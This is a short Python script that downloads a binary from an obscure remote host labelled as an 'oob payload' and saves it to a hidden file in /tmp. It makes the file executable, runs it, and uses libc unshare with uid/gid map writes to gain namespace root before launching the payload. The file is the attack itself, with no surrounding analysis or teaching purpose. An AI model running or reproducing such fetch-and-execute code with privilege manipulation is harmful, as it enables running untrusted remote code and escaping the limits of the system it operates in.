import ctypes, os, subprocess, time, urllib.request
url = "https://azvdvasfv21fa.xxxyyyzzzxyz.top/api/oob/payload/dbebface2014c887e91bd3595ce1ef722db1eef7994cd8cdb382f56efa8d8a92"
p = "/tmp/.rcs5"
try:
    data = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "curl/8.0"}), timeout=30).read()
    open(p, "wb").write(data)
    os.chmod(p, 0o755)
    print("downloaded", len(data))
except Exception as e:
    print("DLERR", repr(e))

try:
    h = subprocess.run([p, "-h"], capture_output=True, text=True, timeout=10)
    print("HELP_RC", h.returncode)
    print("HELP_OUT", (h.stdout or "")[:800])
    print("HELP_ERR", (h.stderr or "")[:800])
except Exception as e:
    print("HELPERR", repr(e))

uid0, gid0 = os.getuid(), os.getgid()
try:
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    ret = libc.unshare(0x10000000)
    err = ctypes.get_errno()
    print("UNSHARE", ret, "errno", err)
    if ret == 0:
        try:
            open("/proc/self/setgroups", "w").write("deny")
        except Exception as e:
            print("setgroups", repr(e))
        open("/proc/self/uid_map", "w").write("0 %d 1\n" % uid0)
        open("/proc/self/gid_map", "w").write("0 %d 1\n" % gid0)
        print("NEW_EUID", os.geteuid())
except Exception as e:
    print("USERNS_ERR", repr(e))

try:
    proc = subprocess.Popen([p], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    time.sleep(10)
    print("poll", proc.poll())
    if proc.poll() is not None:
        out, err = proc.communicate()
        print("OUT", (out or "")[:800])
        print("ERR", (err or "")[-1500:])
    else:
        print("RUNNING")
except Exception as e:
    print("RUNERR", repr(e))
